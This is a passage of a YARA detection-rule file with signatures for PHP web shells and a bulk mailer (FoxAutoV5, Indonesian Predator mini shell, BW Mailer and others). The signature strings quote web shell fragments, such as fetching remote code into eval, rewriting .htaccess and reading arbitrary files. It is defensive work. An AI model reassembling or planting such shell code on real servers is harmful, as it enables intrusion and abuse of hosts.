      $s13 = "bJuxPA/zDVHRbTdZckr6iKXUWWwMjuExX948agWddccPmS/vlNjdZvqewzYWhDvJANBUG+ZYng5qXDXCXYdBRWHTULQqTgW5s8p3lNIBiJcCsANtkkhThP9j/G1zJ4DD" ascii
      $s14 = "SkpOWcTOSg7sL2VO2Rj1m25TYMfyEXfTVUXY4keJp2EEobkpZvCcryLyIDOlQg0Ud19LF+r3Xhj4MrbimVldfMo+/lFr40d9FtTiWl9x9s5xelhmYnR38XSfLuZZZQ/X" ascii
      $s15 = "1+MkqRckEbi4bH5e+Y+lwl/MBHd6OeJF3CfkBO8BHyCidr/FZBI1uR1BqeXaSDcgnL9yxjIPJ9u7bkVOnDuSdV41+aNHEbNMd6kD1juUVW2huR1Y/MtxERr5tcrZ0c3u" ascii
      $s16 = "v9Ci4tea6yffNxcW1woXLMQTEySKQM7QJdvFy4alIZ9u5DPzmElyW3dvhh5tO7b+InHyJfPxuc/E7zcPvPAe/2fz7TpPv5RLv+6T7n5t0Z/qk2wmSezy1LuvObjTr/je" ascii
      $s17 = "QDm/ICfntLSZnnFqDvD06wJ9cm6dbA6uMxKdM9AcwbxG8AUXbZMsjY4sOO2rBhQuNNT3HgeZEIRVL7E0l3Nt11LNB5OlXaneBwltNLx8gA0e/oTN6m+cn66kMa5TiZR4" ascii
      $s18 = "POb0L6jnVv6VRZDTYOcsYyyaIP0dFLDw6o3T5Fp5r9DVL+ft7d6+kO+HuHf6X7/D5JMnncvnphsmc5+Gjdvd+Zlahf72fSYcf773Lwp+78S7pgS537VuEaQB9hW8d7Cj" ascii
      $s19 = "QQQzXMV3nbOAOh9QCbgXA118NXd3HYmQYefa4thKDpN6IrpIVkNVxbfjiwxv8a9EgtKjvkA4ZepFN6+R/X39F4BMOSe0BjU3nsrZyttvb3T3afnaiCEzKaT0FxI+rI0O" ascii
      $s20 = "amxMamyU0DlhzN6zLEvxBFfzrE/zrJfhfjz3L8x1qzZDDr0JnbUJnrYTO4dHhNjFDk5bgN8vw58q/0K90o6+XlHbVSZvmXwB8u69TUe0cUOtk2W2tIY9PiGqp0AjBHJI" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule shell_ruzhu {
   meta:
      description = "shell - Ruzhu"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "19bcd130a2cc00631644fa1842542bce1caf78870bff0eb00da03d8f232e49df"
   strings:
      $s1 = "yZXNzLXRoaXMucGhwfHVwbG9hZC5waHB8YXN5bmMtdXBsb2FkLnBocHxtZW51LWhlYWRlci5waHB8b3B0aW9ucy1kaXNjdXNzaW9uLnBocHxwcml2YWN5LnBocHx1c2V" ascii /* base64 encoded string 'ess-this.php|upload.php|async-upload.php|menu-header.php|options-discussion.php|privacy.php|use' */
      $s2 = "tYWRkLnBocHxtcy1lZGl0LnBocHxvcHRpb25zLnBocHxlZGl0LWNvbW1lbnRzLnBocHxsaW5rLW1hbmFnZXIucGhwfG1zLW9wdGlvbnMucGhwfG9wdGlvbnMtcmVhZGl" ascii /* base64 encoded string 'add.php|ms-edit.php|options.php|edit-comments.php|link-manager.php|ms-options.php|options-readi' */
      $s3 = "waHB8bGluay1wYXJzZS1vcG1sLnBocHxtcy1zaXRlcy5waHB8b3B0aW9ucy13cml0aW5nLnBocHx0aGVtZXMucGhwfGFkbWluLWFqYXgucGhwfGVkaXQtZm9ybS1jb21" ascii /* base64 encoded string 'hp|link-parse-opml.php|ms-sites.php|options-writing.php|themes.php|admin-ajax.php|edit-form-com' */
      $s4 = "tbWVudHMtcG9zdC5waHB8d3AtY3Jvbi5waHB8d3AtbG9hZC5waHB8d3AtbWFpbC5waHB8d3Atc2lnbnVwLnBocHx4bWxycGMucGhwfGVkaXQtZm9ybS1hZHZhbmNlZC5" ascii /* base64 encoded string 'ments-post.php|wp-cron.php|wp-load.php|wp-mail.php|wp-signup.php|xmlrpc.php|edit-form-advanced.' */
      $s5 = "8cmV2aXNpb24ucGhwfHVzZXJzLnBocHxjdXN0b20tYmFja2dyb3VuZC5waHB8bXMtYWRtaW4ucGhwfG9wdGlvbnMtbWVkaWEucGhwfHNldHVwLWNvbmZpZy5waHB8d2l" ascii /* base64 encoded string 'revision.php|users.php|custom-background.php|ms-admin.php|options-media.php|setup-config.php|wi' */
      $s6 = "tZW50LnBocHxsaW5rLnBocHxtcy10aGVtZXMucGhwfHBsdWdpbi1lZGl0b3IucGhwfGFkbWluLWZvb3Rlci5waHB8ZWRpdC1saW5rLWZvcm0ucGhwfGxvYWQtc2NyaXB" ascii /* base64 encoded string 'ent.php|link.php|ms-themes.php|plugin-editor.php|admin-footer.php|edit-link-form.php|load-scrip' */
      $s7 = "waHB8YWRtaW4taGVhZGVyLnBocHxlZGl0LXRhZy1mb3JtLnBocHxtZWRpYS1uZXcucGhwfG15LXNpdGVzLnBocHxwb3N0LW5ldy5waHB8YWRtaW4ucGhwfGVkaXQtdGF" ascii /* base64 encoded string 'hp|admin-header.php|edit-tag-form.php|media-new.php|my-sites.php|post-new.php|admin.php|edit-ta' */
      $s8 = "ncy5waHB8bWVkaWEucGhwfG5hdi1tZW51cy5waHB8cG9zdC5waHB8YWRtaW4tcG9zdC5waHB8ZXhwb3J0LnBocHxtZWRpYS11cGxvYWQucGhwfG5ldHdvcmsucGhwfHB" ascii /* base64 encoded string 's.php|media.php|nav-menus.php|post.php|admin-post.php|export.php|media-upload.php|network.php|p' */
      $s9 = "zYW1wbGUucGhwfHdwLWxpbmtzLW9wbWwucGhwfHdwLWxvZ2luLnBocHx3cC1zZXR0aW5ncy5waHB8d3AtdHJhY2tiYWNrLnBocHx3cC1hY3RpdmF0ZS5waHB8d3AtY29" ascii /* base64 encoded string 'ample.php|wp-links-opml.php|wp-login.php|wp-settings.php|wp-trackback.php|wp-activate.php|wp-co' */
      $s10 = "0cy5waHB8bXMtdXBncmFkZS1uZXR3b3JrLnBocHxhZG1pbi1mdW5jdGlvbnMucGhwfGVkaXQucGhwfGxvYWQtc3R5bGVzLnBocHxtcy11c2Vycy5waHB8cGx1Z2lucy5" ascii /* base64 encoded string 's.php|ms-upgrade-network.php|admin-functions.php|edit.php|load-styles.php|ms-users.php|plugins.' */
      $s11 = "yLWVkaXQucGhwfG1lbnUucGhwfG9wdGlvbnMtZ2VuZXJhbC5waHB8cHJvZmlsZS5waHB8dXNlci1uZXcucGhwfG1vZGVyYXRpb24ucGhwfG9wdGlvbnMtaGVhZC5waHB" ascii /* base64 encoded string '-edit.php|menu.php|options-general.php|profile.php|user-new.php|moderation.php|options-head.php' */
      $s12 = "kZ2V0cy5waHB8Y3VzdG9tLWhlYWRlci5waHB8bXMtZGVsZXRlLXNpdGUucGhwfG9wdGlvbnMtcGVybWFsaW5rLnBocHx0ZXJtLnBocHxjdXN0b21pemUucGhwfGxpbms" ascii /* base64 encoded string 'gets.php|custom-header.php|ms-delete-site.php|options-permalink.php|term.php|customize.php|link' */
      $s13 = "sNCiAgICB9DQoNCi8vIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KLyoqDQogKiDovazljJYgXCDkuLogLw0KIC" ascii
      $s14 = "RyPg0KPHRkIGNsYXNzPXRkX2hvbWU+IDxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsUjBsR09EbGhFd0FRQUxNQUFBQUFBUC8vLzV5Y0FNN09ZLy8vblAvL3" ascii
      $s15 = "lKcjZBZnA1K21EOUhjTURZWU5nOGRJWWlnWmF4bDdHYWNZdHhrdm1VeW1CZE9YbWNoVU1OY3lHNWxubUErWWIxVllLdllxZkJXUnloS1ZPcFZXbFg2VjU2cFVWWE5WUD" ascii
      $s16 = "                        $general_template_code = @file_get_contents($file_general_template_path);" fullword ascii
      $s17 = "WtQbUlqTW9rWlVORG51ZjhFdHRLVmc2UzBoZ3VQaVFDVm05UE9RZ1diN3I3UTNscHIveWlTS3J3Q25oMEVGRGxkRXVGakorZEM3Mi9iUUdrTmpManlid2hyMWFCWWk3c" ascii
      $s18 = "ZIZ0lyOUZ1eFlqaTFNWGR5NHhYVks2WkhocDhOSjl5MmpMc3BiOVVPSllVbFh5YW5uYzhvNVNnOUtscFVNcmdsYzBsYW1VeWN0dXJ2UmF1V01WWVpWa1ZlOXFsOVZiVm" ascii
      $s19 = "NISmxlSVM2WDh5OFIrVy9RbVRkdzBBcklaUHdFNjJCN1hMYk1CKzdnRUNpdzVZMG5ZQVFIN3pMWXdhQzVFQUVHYzBNbm4zQUFDVHYvbVBRQ3NCQU0yWHBPTUFBTHpvR0" ascii
      $s20 = "                            $jue_jiang_404 = \"PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ1BSQycpO" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule shell_FoxAutoV5 {
   meta:
      description = "Shell FoxAutoV5"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-01"
      hash1 = "7d232f31c931c7f7b41339775539dc4014f2a81770c9d0c3a0a144b2c094940f"
   strings:
      $x1 = "<?php error_reporting(0); @ini_set('error_log', NULL); @ini_set('log_errors', 0);  @ini_set('display_errors', 0);  echo \"FoxAut" ascii
      $s2 = "W5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgojIEVORAo=\"); if (file_exists(\"$root/wp-config.php\") && file_exists(\"$root/.htaccess\")){ u" ascii
      $s3 = "open(\"$root/.htaccess\",\"w\"),$htaccess);} }elseif (file_exists(\"$root/configuration.php\") && file_exists(\"$root/.htaccess" ascii
      $s4 = "75%73%66%6F%78%2E%63%6F%6D'))</script> , anonymousfox.net<br>Telegram: @Anonymous_Fox\\n\"; if (isset($_GET[\"403\"])){ $htacces" ascii
      $s5 = "e(fopen(\"$root/.htaccess\",\"w\"),$htaccess); } } if (file_exists(\"$root/.user.ini\")){ unlink(\"$root/.user.ini\"); }  } $cod" ascii
      $s6 = "URNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, \"Mozilla/5.0 (Windows NT 10.0;" ascii
      $s7 = "ink(\"$root/.htaccess\"); if (function_exists('file_put_contents')) { file_put_contents(\"$root/.htaccess\",$htaccess); }else{ f" ascii
      $s8 = "(\"$root/.htaccess\"); if (function_exists('file_put_contents')) { file_put_contents(\"$root/.htaccess\",$htaccess); }else{ fwri" ascii
      $s9 = "<?php error_reporting(0); @ini_set('error_log', NULL); @ini_set('log_errors', 0);  @ini_set('display_errors', 0);  echo \"FoxAut" ascii
      $s10 = "p://'.$_GET[\"php\"]; $t = \"<token>000000000</token>\"; if (empty($code) or !stristr($code, \"http\")){ exit; } else { $php=fil" ascii
      $s11 = " curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEAD" ascii
      $s12 = "ER, false); return curl_exec ($curl); } ?>" fullword ascii
      $s13 = "V5 [The best tool]<br>Download: anonymousfox.co , <script type='text/javascript'>document.write(unescape('%61%6E%6F%6E%79%6D%6F%" ascii
      $s14 = "HAkIC0gW0xdClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kClJld3JpdGVSdWxlIC4ga" ascii
      $s15 = "contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace(\"<?php\", \"\", $php); $php=str_replace(\"?>\", \"\"," ascii
      $s16 = "WOW64; rv:43.0) Gecko/20100101 Firefox/43.0\"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,\"https://\")" ascii
      $s17 = "base64_decode(\"IyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4KUmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleC5w" ascii
      $s18 = "eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RET" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule shell_kids_jaman_now {
   meta:
      description = "shell - Kids Kids Jaman Now"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-01"
      hash1 = "e3a8aa44722f2e6b12d003bede1ad8a5bbb649f105a3d24ae5a9a2849f089c7a"
   strings:
      $s1 = "//Shell Recoded From IndoXploit Shell" fullword ascii
      $s2 = "$Kidsjamannow= \"7X35e9rIsujPme+b/6Gj8Q32jc1zO4nXGeyAaoyxjZdZHp9RJG6MhSRAU8zk/e2vqhepJQQGh9xmzn2Ts0v0RV3dXV1IXV1deriG4XZ33TAt3Vx" ascii
      $s3 = "2H25oDwviqLEMgj/cyB2KV4xvSPyUfXvcRZHkYuafb350kuKZf+C0aR7s218WYOmw+woYVZaQ09bY9BN+YenbYjzogJlmTIJ0bChoNVoAWf8SZ0WDcyhjgEI/D66HiBQ" ascii
      $s4 = "T9qLUibmfw8lQWfMRW/MRcGYwZBEdtkFru+3gZwOO1rVeYKWdDdoAzTOLWxZSgL9BpK2AkipBW2qyxr+zXP0CVlys6+BwvpKRf0GdaY+1qCS0+hbwB42RE7C/+Xw/37r" ascii
      $s5 = "//Thanks Buat Yg Udh Support Buat Shell Ini" fullword ascii
      $s6 = "2lbBp+2i5ZTuq2pFq+w37Fx6+juXIvTceCfFQKYoOIB5OslVZnEqWh23vqhkkFqBNPtQFLov5xo/GyHU9+06Hatd+MIBIn+hAosjBOqlxQzOqd8hdFRu+3OYLA+GNrsF" ascii
      $s7 = "+xflg3eAaKltEPgYY8d2thKXxdRQd7g+yfFotUuFLk8qYBi2xt0WglhdsAsO1gB5aVBaNChtX8Jl7I5eJB+5H+tj7O4Wq0sKbTyq/bq6runLpHRoPMNvw4XanlK4uq+2" ascii
      $s8 = "OryrnH8u+hs3BwP6fWOQLdwB4zk8HBydH5RNvRvO4CQGoNUGVHp1o73nlQe1IyBzj8LGCwnNs+MCMDDBuHV92r8p6kYmBGgPi0h/Dx8o2/fOKD7AfEw/h2dkd7g4D2WI" ascii
      $s9 = "s1hCOXTmzCmDOhkj8aaWRld3Kp4cuNEnSRvLj0aSrXy02ktenBJutBKqBcxnrKlU8WCiWc+0/lpZPGQDi+fUAwxfx3Ljqu0XZ8m3zDqoznWTnVfFculsmV3rfkPzp7NI" ascii
      $s10 = "ohteZSk2vDMD1J1Td/dppWuxQihYnh0jmEQgNRU2YIBJ+IMcpfMzA3vSR7ef2j2DPyvXeU4UNNPrba4+hxXRedCT3N1Q+mpz5Cx06KkoKsrscHMAruNEJy4E0TQ1RYXf" ascii
      $s11 = "/1GT/1compT2PRFxEsQgNZqcVwCQlLaZABPjGqdDx6TjsjT6nyW+rUygbZz8iMkywqL1S4mmV9+BoeXwxSW2GxI8ikhU7uSrgyBNOnyjCipecoCfImE6y4lpX+HhzRDC" ascii
      $s12 = "lGDffWP9HeZuNAclOKCC+IGtUTmpzBSCioaMDid0Ka4Tyxx1oo6boHz/ZjJY/45KwumfKTxPMXK7n9stN1qNRxFWvL5WGNl5dCCHlhjjN21EK/KiE31TUD9Efoc29PQJ" ascii
      $s13 = "BP0Mc1QFqtdbDRnOAZ414mHE2dddcGlPoCAdhBnAIBT6K2yb02SAg6RpL87JBXy8c9Hjbc8HK38MTlogAnfrBQkf+tmkktsaaz7wqFv4f2U/sacTIPpNQniaO6hPI8/E" ascii
      $s14 = "hdJytbhZZUbVuty7u9s7vturlA93e4Vyd0Odqm+pZ0o/qhZ4l6f7SHmueAErm7EmGmVwNReEyYSPAUoFUwfB9jXDjeaIAecgBAUDbqE6M7Rtnl3/1tRZ16j3GvYiSoyD" ascii
      $s15 = "v196lT+X7+7L9N9+JpNMYtvl+497p/Cpwu+nh8yeut9d3YDfmUk58Z+SSejfyvX6bLkKH73yHcvBShfhX7FLvfdivn3Mrn11Nz6cPxreaPXovE2+Pa0c7usXjY/X/lbR" ascii
      $s16 = "YeJlm0NCIhiihBQzb9ybCsxYU7OpgIyhPlw+UqEqVFXww3VKAyL8IMliUElgBkTS6hiykm+FfuuxHdxinKx+8wzcwWiMpchGO7Sj4mKohiY8ddPhYjaQodtjjWc6fpD1" ascii
      $s17 = "i3LDCFvvuTMVNlhmgyAngCDSyTYb690W1fvSvsbMvjspZ1Dcwcu174AmatCy4el25R078laPYJJJRVvbGQ4s6Tkx0V7Mvbrh6lDPMPAQyGRIz2j4Cos8vsbjTwEIdneT" ascii
      $s18 = "PLhc+ZSC5ojXXXzrDhtze2ShXqoWj6rFL6nrg4P9+iH8qpevqoWD1NelJfIXTADYbbnnqqYBICxdt9qLypWm9Xy3o5nKMkRXfkZi4Md9qWPOkvbb9m7xDr+6lg3ltIH7" ascii
      $s19 = "UUF7C66JPLKrNVxoRMnArwxo/2rwhrfOa1CrQu9/sWcsjP4yi0tmVkV3UjZe3sOLh2J2gagmGLPuRyw1chJnkCZFyxHzQYQZhWrM65bvL6Yyi+n//n1282Qzg/4erDa/" ascii
      $s20 = "bW0j0jdNhPath7Q1tmKsHv07uV+i6BiQIfaEo/+W87N1y5GTLF6S5kSOl1enGWonrFoUjpTLBmUy2T6wWE6gUUcE3EOKVdCnAM4uv42DN0ho1tlRIMmdQdHTv7GjYOHN" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      8 of them
}

rule shell_Indonesian_Predator {
   meta:
      description = "Mini Shell by Indonesian Predator"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "7b730ab8ac42b5dfa4d4e65dd06f8d5e4dde63665bec3a76eb2e9fb0336f569c"
   strings:
      $s1 = "<style type=\"text/css\">@import url(\"https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2" ascii
      $s2 = "<style type=\"text/css\">@import url(\"https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2" ascii
      $s3 = "/*------------------ Login Data End ----------*/" fullword ascii
      $s4 = "/*------------------ LOGIN -------------------*/" fullword ascii
      $s5 = "<link href=\"https://fonts.googleapis.com/css?family=Lacquer|&display=swap\" rel=\"stylesheet\">" fullword ascii
      $s6 = "        if($_POST[\"usrname\"]==$username && $_POST[\"passwrd\"]==$password)" fullword ascii
      $s7 = "if(!empty($_SERVER['HTTP_USER_AGENT']))" fullword ascii
      $s8 = "$email=\"wawankepaladesa@gmail.com\";" fullword ascii
      $s9 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s10 = "    #loginbox { font-size:11px; color:green; width:1200px; height:200px; border:1px solid #4C83AF; background-color:#111111; bor" ascii
      $s11 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s12 = " transparent;content: '';height: 0;left: 50%;margin-left: -10px;position: absolute;top: 40px;width: 0;}" fullword ascii
      $s13 = "Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'\" />" ascii
      $s14 = "            print'<script>document.cookie=\"user='.$_POST[\"usrname\"].';\";document.cookie=\"pass='.md5($_POST[\"passwrd\"]).';" ascii
      $s15 = "            print'<script>document.cookie=\"user='.$_POST[\"usrname\"].';\";document.cookie=\"pass='.md5($_POST[\"passwrd\"]).';" ascii
      $s16 = "                print'<script>alert(\"UserName/PassWord Salah Gan\");</script>';" fullword ascii
      $s17 = "ame=\"passwrd\" value=\"password\" onfocus=\"if (this.value == \\'password\\') this.value = \\'\\';\"></td></tr>" fullword ascii
      $s18 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s19 = "<title>Mini Shell INDONESIAN PREDATOR</title>" fullword ascii
      $s20 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}


rule shell_zain_bani {
   meta:
      description = "shell - zani_bani"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-14"
      hash1 = "0e0c060684d89eb04ea7c4a4a07887fbe119ec1ff7574bf085517ad7989b04ef"
   strings:
      $x1 = " goto Fy6Bg; Fy6Bg: error_reporting(0); goto MqCa6; MqCa6: function MhAJ1() { goto a6tUo; a6tUo: $ir7ui = 'I could not have a mo" ascii
      $s2 = "7Ru2Nds01sRcoe+Rrd9tA49eGAV76Mo8XtTPw69SwuY3xVg+tX73uo9NzOQZpIpEox4m/c1M6CVVWsvQlUJ7gLAv0j0rHq7WraboPDj3EqpoRs6auUpTYVW4lvxZzxX0" ascii
      $s3 = "Ve6lDnoRnOVC95+ajutDF8NA+6qxpxEBXPeGUgSABRznBuW/69p5PaYotB5ucDaYuiDLlNn4ul2Z4N3hlda4wUuxcZnEGDDPBd8DicKwEbiV+lf05kj0ZTM9mJhV4DQb" ascii
      $s4 = "MZk+4Uu0lYfK8ckwCvz/YpcoUvaUEMkvpOrCp2DJBAIAizeWV2b+a01ac62QltlT8mACT+CGZYDfxC8/9LjKXRTTxMRpRTwPuctdTkcZO73lQyD87OP0cscnhYPEP7N4" ascii
      $s5 = "lc1ZRag80DOYVQJGvNe4o+bcbMz4VpuzZhLHGbDvFb5vcXhb5Deye0iRMmK76hmMQ5FyZnjwzGKL0giBaAQKKg5zog3EBhyjaGI8509hXUEaRVxv4qHSLWY7+7OTZKcR" ascii
      $s6 = "hnHLae/aP9oTte8fRUuap5ab9cqCI+B87XMuPCqCLPFq/5KsEDRJRPBwiltsiVf6v9rkZe1czi2Sy33XkaktowWkAQBhYBq8oMjhDRXVBHXsZYlOGAOKglm4dDh8Iu7n" ascii
      $s7 = "opLoGX0cPoVUW1M/6M87PLNMytI1Qdnl4tPFPQSwNnhFZ356zDr/z1lMz7PsGWrqN/AfnuQL+2ibSV7UydTI9Qegvh5nPL+2VH+EvAMWFn1n9KHyVTxlHd3xjjC48kRT" ascii
      $s8 = "lTslt3B6C/eC3y4sFUggpbqf9YG7nfQ/0/OlRrAqHZt2NaG5qIdw7IQCQzYIaMjwiRcoRtBLGIM3hF7UusqdVVjfouC91Uge0egu1lwbHB4lCqLMjT/o7oPfP1BxxJe6" ascii
      $s9 = "k/9JKzpvtzXPK4nQ1jGxYzLdfvIOFPCx464jfYYoZV2z2C6HL8iqKFMK3NctOPFCUr5IMS95lHuab8d8aA/Jc5yyfQwH6fmy/V+djUNZhkMfToDaOywypkgr6pKlM0d+" ascii
      $s10 = "SwHgKNMoZoiUXABBzFTyku1mQHYDO62M1RcslJoQMaKOTopbxZkeztlzCwhp+3BfxC5U9R3OSMJFrZxtk8GdFvVZL1RuNrux5GCX0EANBGKyW8H8OAFEcqeuR2pL/4dc" ascii
      $s11 = "fHLr421IG6SRGruNolDOqMGHmNcz6a7Ck7oWySjsapjT6Is33Ezt/4hFa4DTppCkX9PzNq5FcCFKqY7+9LWcL/T6nURrRFICvu9uSEa9Pu1xi3LeA6qbDNav7p9NXhLF" ascii
      $s12 = "kIyX9xh9e59xcSpylsRIOrj9cfnD4Z6vJDkBxafye4DP6k41cJa0Sk7CPNr+l+tge/8IKod6CXRvfhE+VKob2WGoCaitN46BGBfYn4K4eM2RVR3LlkYf52J+oIlqaKuf" ascii
      $s13 = "9KAwEHnPvTXWP/zFfXUfl1twWQ/A3/HcrrQJU5d5pl3hWkzOeqB2lTgCMe2mvCvHrPuse/4dBQCi80hSOciJ40PxBDx07f8AuxrgtEj96rS4jNa9P3OyX/rsKiWYM1dL" ascii
      $s14 = "GenUuE4yvxTrtM3HpbhMBDUt/yj0vahDm15XuTBbJWRtNJzDtlqUBnHzGNvTt2wN7HStfpqBxbZjfpwyOiiwHDzgQEvKzx+pGGoGz0OS8zDWVW66ntbh+K7Q6lRuImas" ascii
      $s15 = "7FY2BWHkui2MGdy/jTZ7gghx0XJvPou/WPZp/c2Rl4xQPv/lC+EisxiqNPiHu2S+U+T//fuy+5TizUOsxiTzzEFBV5RCCK04NurdYPLLwyN3Mrk7owdqMPKlivOTzuQR" ascii
      $s16 = "FAIjbQ3nc7UOeIEp2rp3kzOGA2XrQb5aCCvEiLUCpM76Gk2Hm32qRkBKf+JhuzFVz+Mectpb2FjJ1Ovo5AY1/BlvyG7TWzgeWXs339aHxt2F7fEDI7cXfMqN8QotADxc" ascii
      $s17 = "T464kdY+15D55temkD8aJtq88N8G+H1+6dFK5+bgzis9otXnE3ybt+o3Z3FI5PZZ0512ROs4k8fT2Y1F1t7x1+ADxdou/WVI+exdEdrb+xW60f9YYjmUT9b7ZfGhpGfU" ascii
      $s18 = "6wYZxjxUgu5SxqpjJwDJdg743bCKNt4CtubaIopm3rhpefKtyX4jS3s/1ZzILbERrMnXKIme14e7yGXPXjLTCwScj093zTN41BT2NFvp77Afdjx+CEFVUtr8AABAQBS2" ascii
      $s19 = "PHDq4uKuYItU+8Wl47DD1cD5n+lBBhy3xezf8xamLxPQaSj8Qg1B6L0ARw4UA1lBOYPtlW9BfVjV3mg8GIhA+WtYpYiJeL14pOKEgTjPptv+r5DzGkWGxbkDTaSJhHQA" ascii
      $s20 = "uO92kH+33Mg8rAguwTyB/UWSIQoh10Sd5gumsVdgAk35ngHIgNM0jBJpFh4XI230deHFaJDmToYM6oBHPygc9YCpS4eUGIR3fBVCc6dHMB+QttQC3gVJFx1M1sCXsgfM" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule mailer_Anasoweb_BW_Mailer {
   meta:
      description = "shell - Anasoweb BW Mailer"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "79b19bf8217fc1acb855583c6b2b282be0370f38b0e1bd0974793ae60bcf5533"
   strings:
      $s1 = "$headers .= \"Content-type: text/html; charset=utf-8\\r\\n\";" fullword ascii
      $s2 = "$headers  = \"MIME-Version: 1.0\\r\\n\";" fullword ascii
      $s3 = "font-family:\"Courier New\", Courier, monospace, sans-serif;" fullword ascii
      $s4 = "echo \"* BW!Namber: $count <b>\".$email[$i].\"</b> <font color=red>ERROR TO SEND</font><br><hr>\";" fullword ascii
      $s5 = "$from = $_POST['from'];" fullword ascii
      $s6 = "$realname = $_POST['realname'];" fullword ascii
      $s7 = "$to = $_POST['emaillist'];" fullword ascii
      $s8 = "if(mail($email[$i], $subject, $message, $headers))" fullword ascii
      $s9 = "$headers .= \"From: \".$realname.\" <\".$from.\">\\r\\n\";" fullword ascii
      $s10 = " <form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\">" fullword ascii
      $s11 = "$testa = $_POST['veio'];" fullword ascii
      $s12 = "echo \"* BW!Namber: $count <b>\".$email[$i].\"</b> <font color=green>OK</font><br><hr>\";" fullword ascii
      $s13 = "  <strong>## BW Mailer ! Version 1.0 ##</strong>" fullword ascii
      $s14 = "$subject = $_POST['subject'];" fullword ascii /* Goodware String - occured 1 times */
      $s15 = ".ma3lomat {" fullword ascii
      $s16 = "border-bottom:7px solid #000;" fullword ascii
      $s17 = "height:26px;" fullword ascii
      $s18 = "<title>|#| BW Inbox Mailer |#|</title>" fullword ascii
      $s19 = "echo \"FINISH SEND\";" fullword ascii
      $s20 = "$email = explode(\"\\n\", $to);" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 8KB and
      8 of them
}

rule shell_Keramat {
   meta:
      description = "Shell Keramat by Black root.info Crew"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "706341e3d0220893b812e9c7e7ed203cd602b86194808146f6e1fa8c1785bcb2"
   strings:
      $s1 = "0NGdDdllmanBiOFh2eEZJY09wRjd3M3VlOG9DUnBNK21WWUFOQW91NHAzSGNYT0hFUExPK0FOMlRIa0V" fullword ascii /* base64 encoded string '4gCvYfjpb8XvxFIcOpF7w3ue8oCRpM+mVYANAou4p3HcXOHEPLO+AN2THkE' */
      $s2 = "1TE9SeUp0cSthalh4WGlnN2ZBN2pKeHgwWUROOGZhQnh0cmdsRzZUbjVTQVVyeTE4VFJVeDhLZkxsTlN" fullword ascii /* base64 encoded string 'LORyJtq+ajXxXig7fA7jJxx0YDN8faBxtrglG6Tn5SAUry18TRUx8KfLlNS' */
      $s3 = "iK2kvRWU1MlZObHFwSkEyeTVpekNUT1VVM1FEc2MrN2lSR1RtTDFGUGF2dVBmV2x2bDc0UGlDSW9PRzQ" fullword ascii /* base64 encoded string '+i/Ee52VNlqpJA2y5izCTOUU3QDsc+7iRGTmL1FPavuPfWlvl74PiCIoOG4' */
      $s4 = "QRnJRUGRLVGoydnNVV0hCT0plcUFzejF0dllDa3ZDRGdxS3cvVjJuT0s0Y0tqQ01WbHlqaHJhQkEyNG9" fullword ascii /* base64 encoded string 'FrQPdKTj2vsUWHBOJeqAsz1tvYCkvCDgqKw/V2nOK4cKjCMVlyjhraBA24o' */
      $s5 = "5OEQ4TWpZd3ZlUXJvVjJTQThsVEdHYzVadllqbVIyZi9Fd21NL3ZRQUEwTmplU1dQUTVMNTY4VHdQK0N" fullword ascii /* base64 encoded string '8D8MjYwveQroV2SA8lTGGc5ZvYjmR2f/EwmM/vQAA0NjeSWPQ5L568TwP+C' */
